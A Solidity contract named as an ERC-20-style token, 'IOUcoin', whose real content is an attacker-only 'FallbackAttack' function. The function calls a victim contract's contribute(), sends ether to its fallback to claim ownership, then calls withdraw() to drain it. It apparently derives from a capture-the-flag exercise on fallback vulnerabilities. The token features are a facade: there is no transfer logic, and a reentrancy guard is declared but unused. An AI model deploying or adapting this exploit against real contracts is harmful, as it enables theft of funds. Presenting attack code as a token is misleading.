// SPDX-License-Identifier: GPL-3.0

// 
pragma solidity ^0.8.0;

contract IOUcoin {
    string public name="IOUcoin"; 
    uint8 public decimals = 18;
    string public symbol = "IOI";
    uint public totalPublic;
    
    address payable public attacker;
    bytes4 private constant CONTRIBUTE_SELCTOR = bytes4(keccak256(bytes("contribute()")));
    bytes4 private constant WITHDRAW_SELECTOR = bytes4(keccak256(bytes("withdraw()")));

    mapping (address => uint256) public balances;
    mapping (address => mapping(address =>uint256)) public allowed;

    constructor() {
        totalPublic = 1000000000;
        attacker = payable(msg.sender);
        
    }
     function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }


     modifier onlyAttacker() {
        require(msg.sender == attacker, "FallbackAttack: Only attacker can perform the action.");
        _;
    }
    
     
    function attack(address _victim) external payable onlyAttacker  {
       
        require (msg.value >= 0.001 ether, "FallbackAttack: Not enough ethers to attack.");

         bool success;
        
        (success, ) = _victim.call{value: 0.0001 ether }(abi.encodeWithSelector(CONTRIBUTE_SELCTOR));
       

        
        (success, ) = _victim.call{value: 0.0001 ether }("random");
        require(success, "FallbackAttack: Send Ether failed.");

        
        (success, ) = _victim.call(abi.encodeWithSelector(WITHDRAW_SELECTOR));
        require(success, "FallbackAttack: Withdraw failed.");
    }
 bool internal locked;

   modifier noReentrancy() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
}